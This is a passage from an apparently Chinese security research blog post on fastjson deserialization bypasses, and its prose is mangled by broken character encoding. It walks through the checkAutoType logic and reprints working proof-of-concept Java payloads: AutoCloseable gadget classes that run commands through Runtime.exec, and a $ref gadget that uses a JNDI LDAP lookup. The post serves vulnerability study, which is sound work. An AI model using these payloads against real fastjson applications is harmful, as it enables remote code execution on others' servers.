src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733647003075-cd63dae7-82ab-427e-bfc7-ef56378b8876.png"></p><p>ä¼šäºŒæ¬¡è¿›å…¥checkAutoTypeé‡ŒypeNameå‚æ•°æ˜¯PoCä¸­ç¬¬äºŒä¸ªæŒ‡å®šçš„ç±»ï¼ŒexpectClasså‚æ•°åˆ™æ˜¯PoCä¸­ç¬¬ä¸€ä¸ªæŒ‡å®šçš„ç±»ï¼š</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733647090986-11e4ca5e-311e-4904-954e-eacf3d13bc48.png"></p><p>ç»§ç»­å‘ä¸‹è·Ÿ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733647124197-c69d6540-ffa1-4140-8b9b-067b1f09101d.png"></p><p>è¿™é‡Œå› ä¸ºautocloseableä¸åœ¨é»‘åå•ä¸­ä¼šç»™èµ‹å€¼ä¸ºtrue</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733647217171-49045951-3927-4d6b-9607-4fbd7dcad6e7.png"></p><p>è¿™é‡Œæˆ‘ä»¬è‡ªå®šä¹‰çš„ç±»æ˜¯ä¸åœ¨é»‘ç™½åå•ä¸­çš„æ‰€ä»¥æ²¡å•¥ç”¨ç»§ç»­å‘ä¸‹èµ°</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733647268910-b347172e-7cc2-4fb3-aecc-31a433a5aa84.png"></p><p>èµ°åˆ°è¿™é‡Œé¢å’Œä¸Šé¢ä¸€æ ·ç»§ç»­è·Ÿ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733647372854-bd3f54c2-c906-4da0-9834-c4ea6fd54b0f.png"></p><p>è¿™é‡Œå¯ä»¥çŸ¥é“ä¹‹å‰èµ‹å€¼ä¸ºexpectClassFlagä¸ºtrueæ‰€ä»¥ä¼šè°ƒç”¨ loadClasså»åŠ è½½æˆ‘ä»¬çš„æ¶æ„ç±»</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733647454391-99cccf27-f56f-4651-bd7a-92fa274145f7.png"></p><p>çœ‹çœ‹ä¸»è¦çš„é€»è¾‘å°±å¯ä»¥äº†ï¼Œè¿™é‡Œä¼šåŠ è½½æ¶æ„ç±»è¿”å›</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733647505791-56d708ae-1e4c-49b2-879a-8bf308800e02.png"></p><p>è¿™é‡Œåˆ¤æ–­æ˜¯å¦jsonTypeã€trueçš„è¯ç›´æ¥æ·»åŠ Mappingç¼“å­˜å¹¶è¿”å›ç±»ï¼Œå¦åˆ™æ¥ç€åˆ¤æ–­è¿”å›çš„ç±»æ˜¯å¦æ˜¯ClassLoaderã€DataSourceã€RowSetç­‰ç±»çš„å­ç±»ï¼Œæ˜¯çš„è¯ç›´æ¥æŠ›å‡ºå¼‚å¸¸ï¼Œè¿™ä¹Ÿæ˜¯è¿‡æ»¤å¤§å¤šæ•°JNDIæ³¨å…¥Gadgetçš„æœºåˆ¶ï¼š</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733647581692-4d696afc-4ec5-4f3c-8d88-22d4cd303af6.png"></p><p>å‰é¢çš„éƒ½èƒ½é€šè¿‡ï¼Œå¾€ä¸‹ï¼Œå¦‚æœexpectClassä¸ä¸ºnullï¼Œåˆ™åˆ¤æ–­ç›®æ ‡ç±»æ˜¯å¦æ˜¯expectClassç±»çš„å­ç±»ï¼Œæ˜¯çš„è¯å°±æ·»åŠ åˆ°Mappingç¼“å­˜ä¸­å¹¶ç›´æ¥è¿”å›è¯¥ç›®æ ‡ç±»ï¼Œå¦åˆ™ç›´æ¥æŠ›å‡ºå¼‚å¸¸å¯¼è‡´åˆ©ç”¨å¤±è´¥ï¼Œè¿™é‡Œå°±è§£é‡Šäº†ä¸ºä»€ä¹ˆæ¶æ„ç±»å¿…é¡»è¦ç»§æ‰¿AutoCloseableæ¥å£ç±»ï¼Œå› ä¸ºè¿™é‡ŒexpectClassä¸ºAutoCloseableç±»ã€å› æ­¤æ¶æ„ç±»å¿…é¡»æ˜¯AutoCloseableç±»çš„å­ç±»æ‰èƒ½é€šè¿‡è¿™é‡Œçš„åˆ¤æ–­</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733647645158-36095b47-faa8-4378-86a1-d1524a2321c3.png"></p><p>èµ°å‡ºæ£€æŸ¥ä¹‹åå°±ä¼šçœŸæ­£ååºåˆ—åŒ–æ¶æ„ç±»ç„¶åæ‰§è¡Œå‘½ä»¤äº†</p><h3 id="è®°å½•ä¸‹y4erå¸ˆå‚…çš„payload"><a href="#è®°å½•ä¸‹y4erå¸ˆå‚…çš„payload" class="headerlink" title="è®°å½•ä¸‹y4erå¸ˆå‚…çš„payload"></a>è®°å½•ä¸‹y4erå¸ˆå‚…çš„payload</h3><p>Runnable</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.heptagram.fastjson;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExecRunnable</span> <span class="keyword">implements</span> <span class="title class_">AutoCloseable</span> &#123;    <span class="keyword">private</span> EvalRunnable eval;</span><br><span class="line">    <span class="keyword">public</span> EvalRunnable <span class="title function_">getEval</span><span class="params">()</span> &#123;        <span class="keyword">return</span> eval;    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setEval</span><span class="params">(EvalRunnable eval)</span> &#123;        <span class="built_in">this</span>.eval = eval;    &#125;</span><br><span class="line">    <span class="meta">@Override</span>    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">close</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    &#125;&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">EvalRunnable</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;    <span class="keyword">private</span> String cmd;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getCmd</span><span class="params">()</span> &#123;        System.out.println(<span class="string">&quot;EvalRunnable getCmd() &quot;</span>+cmd);        <span class="keyword">try</span> &#123;            Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd&quot;</span>,<span class="string">&quot;/c&quot;</span>,cmd&#125;);        &#125; <span class="keyword">catch</span> (IOException e) &#123;            e.printStackTrace();        &#125;        <span class="keyword">return</span> cmd;    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setCmd</span><span class="params">(String cmd)</span> &#123;        <span class="built_in">this</span>.cmd = cmd;    &#125;</span><br><span class="line">    <span class="meta">@Override</span>    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.heptagram.fastjson;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExecRunnableMain</span> &#123;    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span><span class="string">&quot;&#123;\n&quot;</span> +                <span class="string">&quot;  \&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;,\n&quot;</span> +                <span class="string">&quot;  \&quot;@type\&quot;: \&quot;org.heptagram.fastjson.ExecRunnable\&quot;,\n&quot;</span> +                <span class="string">&quot;  \&quot;eval\&quot;:&#123;\&quot;@type\&quot;:\&quot;org.heptagram.fastjson.EvalRunnable\&quot;,\&quot;cmd\&quot;:\&quot;calc.exe\&quot;&#125;\n&quot;</span> +                <span class="string">&quot;&#125;&quot;</span>;        JSONObject.parseObject(payload);    &#125;&#125;</span><br></pre></td></tr></table></figure><p>Readable</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.heptagram.fastjson;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;<span class="keyword">import</span> java.nio.CharBuffer;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExecReadable</span> <span class="keyword">implements</span> <span class="title class_">AutoCloseable</span> &#123;    <span class="keyword">private</span> EvalReadable eval;</span><br><span class="line">    <span class="keyword">public</span> EvalReadable <span class="title function_">getEval</span><span class="params">()</span> &#123;        <span class="keyword">return</span> eval;    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setEval</span><span class="params">(EvalReadable eval)</span> &#123;        <span class="built_in">this</span>.eval = eval;    &#125;</span><br><span class="line">    <span class="meta">@Override</span>    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">close</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    &#125;&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">EvalReadable</span> <span class="keyword">implements</span> <span class="title class_">Readable</span> &#123;    <span class="keyword">private</span> String cmd;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getCmd</span><span class="params">()</span> &#123;        System.out.println(<span class="string">&quot;EvalReadable getCmd() &quot;</span>+cmd);        <span class="keyword">try</span> &#123;            Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;);        &#125; <span class="keyword">catch</span> (IOException e) &#123;            e.printStackTrace();        &#125;</span><br><span class="line">        <span class="keyword">return</span> cmd;    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setCmd</span><span class="params">(String cmd)</span> &#123;        <span class="built_in">this</span>.cmd = cmd;    &#125;</span><br><span class="line">    <span class="meta">@Override</span>    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">read</span><span class="params">(CharBuffer cb)</span> <span class="keyword">throws</span> IOException &#123;        <span class="keyword">return</span> <span class="number">0</span>;    &#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.heptagram.fastjson;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExecReadableMain</span> &#123;    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span><span class="string">&quot;&#123;\n&quot;</span> +                <span class="string">&quot;  \&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;,\n&quot;</span> +                <span class="string">&quot;  \&quot;@type\&quot;: \&quot;org.heptagram.fastjson.ExecReadable\&quot;,\n&quot;</span> +                <span class="string">&quot;  \&quot;eval\&quot;:&#123;\&quot;@type\&quot;:\&quot;org.heptagram.fastjson.EvalReadable\&quot;,\&quot;cmd\&quot;:\&quot;calc.exe\&quot;&#125;\n&quot;</span> +                <span class="string">&quot;&#125;&quot;</span>;        JSONObject.parseObject(payload);    &#125;&#125;</span><br></pre></td></tr></table></figure><h5 id="refæ‹“å±•ä½¿ç”¨"><a href="#refæ‹“å±•ä½¿ç”¨" class="headerlink" title="$refæ‹“å±•ä½¿ç”¨"></a>$refæ‹“å±•ä½¿ç”¨</h5><p>é€šè¿‡$refå¼•ç”¨åŠŸèƒ½ï¼Œæˆ‘ä»¬å¯ä»¥è§¦å‘å¤§éƒ¨åˆ†getteræ–¹æ³•ï¼Œç†è®ºä¸Šå½“å­˜åœ¨å±é™©çš„methodæ–¹æ³•æ—¶æˆ‘ä»¬å¯ä»¥é€šè¿‡æ­¤ç§æ–¹æ³•åœ¨ä¸å¼€å¯AutoTypeçš„æƒ…å†µä¸‹æ¥å®ç°RCEï¼Œä¸‹é¢ä»¥threedr3amå¸ˆå‚…æä¾›çš„payloadä¸ºä¾‹(ä»£ç éƒ¨åˆ†å–è‡ªY4erå¸ˆå‚…)ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.heptagram.fastjson;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;<span class="keyword">import</span> org.apache.shiro.jndi.JndiLocator;<span class="keyword">import</span> org.apache.shiro.util.Factory;<span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RefRCE</span>  &lt;T&gt; <span class="keyword">extends</span> <span class="title class_">JndiLocator</span> <span class="keyword">implements</span> <span class="title class_">Factory</span>&lt;T&gt;, AutoCloseable &#123;    <span class="keyword">private</span> String resourceName;</span><br><span class="line">                                                                                       <span class="keyword">public</span> <span class="title function_">RefRCE</span><span class="params">()</span> &#123;    &#125;</span><br><span class="line">                                                                                       <span class="keyword">public</span> T <span class="title function_">getInstance</span><span class="params">()</span> &#123;        System.out.println(getClass().getName() + <span class="string">&quot;.getInstance() invoke.&quot;</span>);        <span class="keyword">try</span> &#123;            <span class="keyword">return</span> (T) <span class="built_in">this</span>.lookup(<span class="built_in">this</span>.resourceName);        &#125; <span class="keyword">catch</span> (NamingException var3) &#123;            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Unable to look up with jndi name &#x27;&quot;</span> + <span class="built_in">this</span>.resourceName + <span class="string">&quot;&#x27;.&quot;</span>, var3);        &#125;    &#125;</span><br><span class="line">                                                                                       <span class="keyword">public</span> String <span class="title function_">getResourceName</span><span class="params">()</span> &#123;        System.out.println(getClass().getName() + <span class="string">&quot;.getResourceName() invoke.&quot;</span>);        <span class="keyword">return</span> <span class="built_in">this</span>.resourceName;    &#125;</span><br><span class="line">                                                                                       <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setResourceName</span><span class="params">(String resourceName)</span> &#123;        System.out.println(getClass().getName() + <span class="string">&quot;.setResourceName() invoke.&quot;</span>);        <span class="built_in">this</span>.resourceName = resourceName;    &#125;</span><br><span class="line">                                                                                       <span class="meta">@Override</span>    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">close</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;    &#125;&#125;</span><br></pre></td></tr></table></figure><p>è½½è·éƒ¨åˆ†ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.heptagram.fastjson;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RefRCEMain</span> &#123;    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span> +                <span class="string">&quot;  \&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;,\n&quot;</span> +                <span class="string">&quot;  \&quot;@type\&quot;: \&quot;org.heptagram.fastjson.RefRCE\&quot;,\n&quot;</span> +                <span class="string">&quot;  \&quot;resourceName\&quot;: \&quot;ldap://localhost:1099/Exploit\&quot;,\n&quot;</span> +                <span class="string">&quot;  \&quot;instance\&quot;: &#123;\n&quot;</span> +                <span class="string">&quot;    \&quot;$ref\&quot;: \&quot;$.instance\&quot;\n&quot;</span> +                <span class="string">&quot;  &#125;\n&quot;</span> +                <span class="string">&quot;&#125;&quot;</span>;        System.out.println(json);        JSON.parse(json);</span><br><span class="line">                                                                    &#125;&#125;</span><br></pre></td></tr></table></figure><p>å…·ä½“å‚è€ƒï¼š<a href="https://mp.weixin.qq.com/s/DKG058MCQ8CEI_2ePe2s4g">https://mp.weixin.qq.com/s/DKG058MCQ8CEI_2ePe2s4g</a></p><h2 id="1-2-80bypass"><a href="#1-2-80bypass" class="headerlink" title="1.2.80bypass"></a>1.2.80bypass</h2><p>å‚è€ƒï¼š<a href="https://y4er.com/posts/fastjson-1.2.80">https://y4er.com/posts/fastjson-1.2.80</a></p><p>payloadå‚è€ƒï¼š<a href="https://github.com/su18/hack-fastjson-1.2.80">https://github.com/su18/hack-fastjson-1.2.80</a></p><h2 id="fastjsonç‰ˆæœ¬å·å¦‚ä½•ç¡®å®š"><a href="#fastjsonç‰ˆæœ¬å·å¦‚ä½•ç¡®å®š" class="headerlink" title="fastjsonç‰ˆæœ¬å·å¦‚ä½•ç¡®å®š"></a>fastjsonç‰ˆæœ¬å·å¦‚ä½•ç¡®å®š</h2><p>å‚è€ƒï¼š<a href="https://blog.csdn.net/m0_71692682/article/details/125814861">https://blog.csdn.net/m0_71692682&#x2F;article&#x2F;details&#x2F;125814861</a></p><h2 id="fastjsonåŸç”Ÿååºåˆ—åŒ–1-2-48"><a href="#fastjsonåŸç”Ÿååºåˆ—åŒ–1-2-48" class="headerlink" title="fastjsonåŸç”Ÿååºåˆ—åŒ–1.2.48"></a>fastjsonåŸç”Ÿååºåˆ—åŒ–1.2.48</h2><p>åœ¨å‰é¢å­¦ä¹ çš„è¿‡ç¨‹ä¸­å…¶å®ä¹Ÿæœ‰æ³¨æ„æ‡‚å•Šjsonåœ¨è¿›è¡Œtostingæ–¹æ³•æ—¶ä¹Ÿä¼šè§¦å‘getter æ–¹æ³•</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">package com.ocean;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public class User &#123;</span><br><span class="line">    String name;</span><br><span class="line">    int age;</span><br><span class="line">    int <span class="built_in">id</span>;</span><br><span class="line">    public <span class="function"><span class="title">User</span></span>() &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;æ— å‚æ„é€ &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    public User(String name, int age, int <span class="built_in">id</span>) &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;æœ‰å‚æ„é€ &quot;</span>);</span><br><span class="line">        this.name = name;</span><br><span class="line">        this.age = age;</span><br><span class="line">        this.id = <span class="built_in">id</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String <span class="function"><span class="title">getName</span></span>() &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;get name&quot;</span>);</span><br><span class="line">        <span class="built_in">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setName(String name) &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;set name&quot;</span>);</span><br><span class="line">        this.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public int <span class="function"><span class="title">getAge</span></span>() &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getage&quot;</span>);</span><br><span class="line">        <span class="built_in">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setAge(int age) &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;set age&quot;</span>);</span><br><span class="line">        this.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public int <span class="function"><span class="title">getId</span></span>() &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;get id&quot;</span>);</span><br><span class="line">        <span class="built_in">return</span> <span class="built_in">id</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setId(int <span class="built_in">id</span>) &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;set id&quot;</span>);</span><br><span class="line">        this.id = <span class="built_in">id</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String <span class="function"><span class="title">toString</span></span>() &#123;</span><br><span class="line">        <span class="built_in">return</span> <span class="string">&quot;User&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;</span><span class="string">&#x27; +</span></span><br><span class="line"><span class="string">                &quot;, age=&quot; + age +</span></span><br><span class="line"><span class="string">                &quot;, id=&quot; + id +</span></span><br><span class="line"><span class="string">                &#x27;</span>&#125;<span class="string">&#x27;;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733910477473-d92861e6-3e04-446a-b6fe-f2704325f70d.png"></p><p>å¯ä»¥çœ‹åˆ°æµ‹è¯•å‡ºæ¥çš„ç»“æœæ˜¯å…ˆè°ƒç”¨ç±»çš„æ„é€ æ–¹æ³•å†å»è°ƒç”¨ç±»ä¸­çš„getteræ–¹æ³•ã€‚è·Ÿä¸€ä¸‹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733911794039-c1f2c511-fc45-41c7-830d-7fae52156189.png"></p><p>è¿™é‡Œä¼šç»§ç»­è·Ÿè¿›å‡ ä¸ªtoJSONStringæ–¹æ³•é‡Œç›´æ¥ç•¥è¿‡åˆ°åé¢éƒ¨åˆ†</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733911841190-8d882ee5-b48b-45ee-9e64-639401ec6a49.png"></p><p>ä¼šåœ¨æœ€åä¸€ä¸ªtoJSONStringæ–¹æ³•ä¸­è°ƒç”¨writeæ–¹æ³•ï¼Œæˆ‘ä»¬è·Ÿè¿›çœ‹çœ‹æµç¨‹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733911993693-aedabe35-d916-4561-8e62-d481c4b13409.png"></p><p>è¿™é‡Œä¼šå»è·å–writerå¯¹è±¡è·Ÿè¿›</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733912385459-0d5b3b2b-f301-4ecb-b01c-818f7f368cdb.png"></p><p>è¿™é‡Œä¼šè°ƒç”¨SerializeConfigçš„getObjectWriteræ–¹æ³•è·Ÿè¿›</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733912442600-314aac33-9880-4e96-ac11-4b8663e2259e.png"></p><p>è¿™éƒ¨åˆ†çš„æµç¨‹å°±å¤æ‚äº†ç‚¹ä½†å…¶å®ä¹Ÿæ²¡å•¥å…³é”®ç‚¹ï¼Œä»–è¿™é‡Œä¼šå»è·å–æˆ‘ä»¬çš„è‡ªå®šä¹‰ç±»çš„writerå¯¹è±¡ä½†æ˜¯ä¸€ç›´éƒ½æ˜¯ç©ºçš„ç»§ç»­è·Ÿåˆ°ä¸‹é¢çš„é€»è¾‘é‡Œå»</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733912534445-f9897d4f-4c3e-471f-8761-5e5f08c44ac1.png"></p><p>è¿™é‡Œå°±æ˜¯ä¼šåˆ¤æ–­æˆ‘ä»¬çš„ç±»æ˜¯ä¸æ˜¯ä»–åˆå§‹åŒ–æ—¶è‡ªå®šä¹‰çš„å­ç±»å…¶å®éƒ½ä¸æ˜¯ç»§ç»­å‘ä¸‹èµ°</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733912662751-463dfb19-6e31-4c4c-919f-4d61f65c90be.png"></p><p>è¿™é‡Œä¼šç»™æˆ‘ä»¬åˆ›å»ºåºåˆ—åŒ–å™¨ç„¶åè¿”å›æˆ‘ä»¬çš„writerï¼Œç»§ç»­èµ°</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733912797718-998a0db2-17e9-4e17-8f3c-2072bb9dfadc.png"></p><p>ä¼šè°ƒç”¨writeæ–¹æ³•è¿™é‡Œæ˜¯é€šè¿‡asmè¿›è¡Œåˆ›å»ºçš„å…·ä½“å¯ä»¥çœ‹çœ‹ä¸‹é¢è¿™å‡ ç¯‡å¸ˆå‚…è®²çš„</p><p>å‚è€ƒï¼š<a href="https://mp.weixin.qq.com/s/KXVMe_F4u6jw60C6VZFIAA">https://mp.weixin.qq.com/s/KXVMe_F4u6jw60C6VZFIAA</a> ï¼ˆè·Ÿçš„æŒºç»†çš„å¯ä»¥çœ‹çœ‹ï¼‰</p><p><a href="https://y4tacker.github.io/2023/03/20/year/2023/3/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#%E5%A6%82%E4%BD%95%E8%A7%A6%E5%8F%91getter%E6%96%B9%E6%B3%95">https://y4tacker.github.io/2023/03/20/year/2023/3/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#%E5%A6%82%E4%BD%95%E8%A7%A6%E5%8F%91getter%E6%96%B9%E6%B3%95</a></p><p><a href="https://xz.aliyun.com/t/14896">https://xz.aliyun.com/t/14896</a></p><p>åœ¨å¼•ç”¨y4å¸ˆå‚…å‰é¢çš„è¯</p><p>:::tips<br>æ—¢ç„¶æ˜¯ä¸åŸç”Ÿååºåˆ—åŒ–ç›¸å…³ï¼Œé‚£æˆ‘ä»¬å»fastjsonåŒ…é‡Œå»çœ‹çœ‹å“ªäº›ç±»ç»§æ‰¿äº†Serializableæ¥å£å³å¯ï¼Œæœ€åæ‰¾å®Œåªæœ‰ä¸¤ä¸ªç±»ï¼ŒJSONArrayä¸JSONObjectï¼Œè¿™é‡Œæˆ‘ä»¬å°±æŒ‘ç¬¬ä¸€ä¸ªæ¥è®²(å®é™…ä¸Šè¿™ä¸¤ä¸ªåœ¨åŸç”Ÿååºåˆ—åŒ–å½“ä¸­åˆ©ç”¨æ–¹å¼æ˜¯ç›¸åŒçš„)</p><p>é¦–å…ˆæˆ‘ä»¬å¯ä»¥åœ¨IDEAä¸­å¯ä»¥çœ‹åˆ°ï¼Œè™½ç„¶JSONArrayæœ‰implementè¿™ä¸ªSerializableæ¥å£ä½†æ˜¯å®ƒæœ¬èº«æ²¡æœ‰å®ç°readObjectæ–¹æ³•çš„é‡è½½ï¼Œå¹¶ä¸”ç»§æ‰¿çš„JSONç±»åŒæ ·æ²¡æœ‰readObjectæ–¹æ³•ï¼Œé‚£ä¹ˆåªæœ‰ä¸€ä¸ªæ€è·¯äº†ï¼Œé€šè¿‡å…¶ä»–ç±»çš„readObjectåšä¸­è½¬æ¥è§¦å‘JSONArrayæˆ–è€…JSONç±»å½“ä¸­çš„æŸä¸ªæ–¹æ³•æœ€ç»ˆå®ç°ä¸²é“¾</p><p>:::</p><p><img 